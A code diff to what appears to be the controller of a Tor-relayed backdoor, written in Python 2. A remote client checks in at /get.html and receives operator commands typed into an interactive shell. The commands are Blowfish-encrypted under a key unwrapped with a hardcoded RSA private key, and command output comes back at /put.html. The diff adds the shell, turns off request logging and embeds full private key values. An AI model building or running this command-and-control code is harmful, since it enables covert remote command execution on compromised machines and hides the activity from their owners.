@@ -29,17 +29,35 @@
 # POSSIBILITY OF SUCH DAMAGE.
 
 
-import string,cgi,time,binascii, rsa, random, sys
+import string,cgi,time,binascii, rsa, random, sys, cmd, readline
 from os import curdir, sep
 from blowfish import *
 from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
 
 
-private={'q': 43615811671814373094973431074211611904027744219778025801720557316822230250434056544051507340719175444092355583020411221349351216897664107344623761234830363376199492849362431206989657924029014046206483706730617743375805145152388688032487117844662631241109359000572747929989619430228147813905246546098397291487L, 'p': 152930877457113091873297711980178686176081054477979188664949169171308019566743503223789650266415620122641795368014548446833804975022572957821386974923833198207253213410141004758538967313032902107155780629415154943427618382407936805600244475709731511817249701995901307412547057212753855838527041140583136546083L, 'd': 717119285846981259123790183711565570941015506498217982140523045665647499093664340912431683794241803027115370417810645747847338826808600767695759833004561942803937752154483901427399923113938784785407951780672817533252001683343850040539774178319652601964230462305719271831991346570742051125845423805466414352814792825905554160356874359556168363176146587890558200913905812516970914739816948853253918369023786025143289854503914179166677835860441013946049711864769062812645475312605837307764817042965608618046833445898066028707155933035012678573271172997097834721029190621723637082181869521629401426565153285718263890393L}
+class CustomShell(cmd.Cmd):
+    prompt="prompt: "
+    isShellCmd=False
 
-class MyHandler(BaseHTTPRequestHandler):
+    def default(self,line):
+        self.isShellCmd=True
 
-    passwd="12345678910"
+    def do_test(self,line):
+        print "This is a test"
+
+    def postcmd(self,stop,line):
+         return self.isShellCmd
+        
+
+    def cmdloop(self):
+       cmd.Cmd.cmdloop(self)
+       return self.lastcmd
+
+
+class TorHandler(BaseHTTPRequestHandler):
+
+    private={'q': 43615811671814373094973431074211611904027744219778025801720557316822230250434056544051507340719175444092355583020411221349351216897664107344623761234830363376199492849362431206989657924029014046206483706730617743375805145152388688032487117844662631241109359000572747929989619430228147813905246546098397291487L, 'p': 152930877457113091873297711980178686176081054477979188664949169171308019566743503223789650266415620122641795368014548446833804975022572957821386974923833198207253213410141004758538967313032902107155780629415154943427618382407936805600244475709731511817249701995901307412547057212753855838527041140583136546083L, 'd': 717119285846981259123790183711565570941015506498217982140523045665647499093664340912431683794241803027115370417810645747847338826808600767695759833004561942803937752154483901427399923113938784785407951780672817533252001683343850040539774178319652601964230462305719271831991346570742051125845423805466414352814792825905554160356874359556168363176146587890558200913905812516970914739816948853253918369023786025143289854503914179166677835860441013946049711864769062812645475312605837307764817042965608618046833445898066028707155933035012678573271172997097834721029190621723637082181869521629401426565153285718263890393L}
+    passwd=""
     received_pass=""
     command_response=""
 
@@ -52,8 +70,8 @@ class MyHandler(BaseHTTPRequestHandler):
               qs = self.rfile.read(length)
               values=cgi.parse_qs(qs, keep_blank_values=1)
               try:
-                     passwd=rsa.decrypt(binascii.unhexlify(values['key'][0]),private)
-                     command=decrypt( binascii.unhexlify(values['cmd'][0]) ,rsa.decrypt(binascii.unhexlify(values['key'][0]),private))
+                     passwd=rsa.decrypt(binascii.unhexlify(values['key'][0]),self.private)
+                     command=decrypt( binascii.unhexlify(values['cmd'][0]) ,rsa.decrypt(binascii.unhexlify(values['key'][0]),self.private))
               except KeyError:
                   pass
               
@@ -61,35 +79,40 @@ class MyHandler(BaseHTTPRequestHandler):
                   pass
        return command,passwd
 
+    #overwritten to disable logging
+    def log_message(self, arg1, arg2, arg3, arg4):
+           pass
 
     def do_POST(self):
-            if self.path=="/get.html":
-                    self.command_response,self.passwd=self.get_parameters()
-                    if self.command_response=="HELLO":
-                            command=raw_input("Ready to send a command: ")
-	                    output="cmd=%s" % binascii.hexlify(encrypt(command,self.passwd))
-                            self.send_response(200)
-                            self.end_headers()
-                            self.wfile.write(output)
-                            print "Sent command: %s" % command
-                    else:
-                            self.send_response(404)
-                            self.end_headers()
+            try:
+                if self.path=="/get.html":
+                        self.command_response,self.passwd=self.get_parameters()
+                        if self.command_response=="HELLO":
+                                command=CustomShell().cmdloop()
+	                        output="cmd=%s" % binascii.hexlify(encrypt(command,self.passwd))
+                                self.send_response(200)
+                                self.end_headers()
+                                self.wfile.write(output)
+                        else:
+                                self.send_response(404)
+                                self.end_headers()
 
-            elif self.path=="/put.html":
-                    self.command_response,self.passwd=self.get_parameters()
-                    self.send_response(200)
-                    self.end_headers()
-                    print "command response:\n%s" % (self.command_response)
+                elif self.path=="/put.html":
+                        self.command_response,self.passwd=self.get_parameters()
+                        self.send_response(200)
+                        self.end_headers()
+                        print "%s" % (self.command_response)
 
-            else:
-                    self.send_response(404)
-                    self.end_headers()
+                else:
+                        self.send_response(404)
+                        self.end_headers()
+            except:
+                    print "Lost communication with the client"
 
 def main():
     try:
-        #server = HTTPServer(('', 8080), MyHandler)
-        server = HTTPServer(('127.0.0.1', 8080), MyHandler)
+        #server = HTTPServer(('', 8080), TorHandler)
+        server = HTTPServer(('127.0.0.1', 8080), TorHandler)
         print 'started httpserver...'
         server.serve_forever()
     except KeyboardInterrupt:
